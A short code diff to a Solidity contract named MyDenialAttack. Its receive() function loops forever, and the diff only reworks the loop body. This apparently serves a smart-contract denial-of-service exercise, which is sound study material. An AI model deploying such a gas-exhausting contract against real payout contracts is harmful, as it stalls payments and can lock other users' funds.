@@ -7,6 +7,8 @@ interface IPayable {
 
 contract MyDenialAttack is IPayable {
     receive() external payable override {
-        for (;;) {}
+        for (;;) {
+            this;
+        }
     }
 }
